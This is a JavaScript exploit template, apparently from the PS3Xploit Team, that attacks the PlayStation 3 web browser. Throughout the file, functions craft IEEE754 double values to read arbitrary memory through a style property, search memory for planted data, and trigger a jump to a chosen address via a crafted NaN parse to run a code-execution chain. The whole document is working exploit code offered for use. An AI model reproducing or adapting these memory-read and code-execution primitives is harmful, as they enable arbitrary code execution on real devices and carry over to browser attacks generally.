// PS3 Exploit Template
// PS3Xploit Team 2018 / ps3xploit.com


Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length== 1) return data[0]; 
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign + '0.';
        while(mag++) z += '0';
        return z + str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) z += '0';
    return str + z;
}

function fromIEEE754(bytes, ebits, fbits)
{
	var retNumber = 0;
	var bits = [];
	for (var i = bytes.length; i; i -= 1)
	{
		var byte = bytes[i - 1];
		for (var j = 8; j; j -= 1)
		{
			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
		}
	}
	bits.reverse();
	var str = bits.join('');
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	if (e === (1 << ebits) - 1)
	{
		retNumber = f !== 0 ? NaN : s * Infinity;
	}
	else if (e > 0)
	{
		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	}
	else if (f !== 0)
	{
		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	}
	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}

function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}

function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}

function readMemory(address, size)
{
	if(document.getElementById('exploit'))document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";
	else logAdd(msg_malformed_html);
}

function checkMemory(address, size, len, sub)
{
	if(size<len){throw msg_chk_mem_arg_error+size.toString(16)+" < len=0x"+size.toString(16);logAdd(msg_chk_mem_arg_error+size.toString(16)+" < len=0x"+size.toString(16));}
	if(document.getElementById('exploit'))
	{
		readMemory(address, size);
		if(debug_mode)
		{
			var x=document.getElementById('exploit').style.src.substr(sub,len);
			logAdd(msg_check_memory+s2hex(x));
			return x;
		}
		return document.getElementById('exploit').style.src.substr(sub,len);
	}
	else logAdd(msg_malformed_html);
}

/*
function findJsVariableOffset(name,exploit_data,base,size,debug_mode)
{
	readMemory(base,size);
	var dat=document.getElementById('exploit').style.src.substr(6,size);
	for (var i=0;i<(dat.length*2);i+=0x10)	{
		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
		{
			var match=0;
			for (var k=0;k<(exploit_data.length*2);k+=0x2)
			{
				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2))break;
				match+=1;
			}
			if (match===exploit_data.length)
			{
				var exploit_addr=base+i+4;
				if(debug_mode){logAdd(name+"<font color=%22yellow%22>"+msg_string_located+exploit_addr.toString(16).toUpperCase()+"<br>"+name+" Hex: "+s2hex(exploit_data).toString().toUpperCase()+"</font>");}
				return exploit_addr;
			}
		}
	}
	var end_range=base+size;
	if(debug_mode){logAdd("<font color=%22386E38%22>"+name+"</font> <font color=%22386E38%22>"+msg_string_not_located+"</font> <font color=%22386E38%22>0x"+base.toString(16).toUpperCase()+" - 0x"+end_range.toString(16).toUpperCase()+"</font>");}
	return 0;
}
*/

function findJsVariableOffset(name,exploit_data,base,size,debug_mode)
{
	readMemory(base,size);
	var dat=document.getElementById('exploit').style.src.substr(6,size);
	var i=0;
	var t;
	var k;
	var match;
	var exploit_addr;
	while(i<(dat.length*2))
	{
		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
		{
			match=0;
			for (k=0;k<(exploit_data.length*2);k+=0x2)
			{
				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2)){break;}
				match+=1;
			}
			if (match===exploit_data.length)
			{
				exploit_addr=base+i+4;
				
				for(t=0;t<found_offsets.length;t+=1)
				{
					if(found_offsets[t]===exploit_addr)
					{
						if(debug_mode){logAdd("<font color=%22386E38%22>Found "+name+" at: 0x"+exploit_addr.toString(16)+br+": Offset already used!</font>");}
						return -1;
					}
				}
				found_offsets.push(exploit_addr);
				if(debug_mode){logAdd("<font color=%22yellow%22>Found "+name+" at: 0x"+exploit_addr.toString(16)+br+exploit_data.toAscii(true)+"</font>");}
				return exploit_addr;
			}
		}
		i+=0x10;
	}
	var end_range=base+size;
	if(debug_mode){logAdd("<font color=%22386E38%22>"+name+"</font> <font color=%22386E38%22>"+msg_string_not_located+"</font> <font color=%22386E38%22>0x"+base.toString(16).toUpperCase()+" - 0x"+end_range.toString(16).toUpperCase()+"</font>");}
	return 0;
}

function trigger(exploit_addr){
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function execTrigger()
{
	if(!disable_trigger)
	{
		setTimeout(trigger,1000,jump_1_addr);
		
		msg_success_text=success_chain_exec;
		
		// Override success message
		execSuccessMessage(chain_stackframe);
		
		setTimeout(chainSucceed,2000,msg_success_text);
		postExecTasks(chain_stackframe);
	}
	else{
		msg=trigger_msg2 + jump_1_addr.toString(16).toUpperCase();
		setTimeout(alert,1000,msg);
	}
}
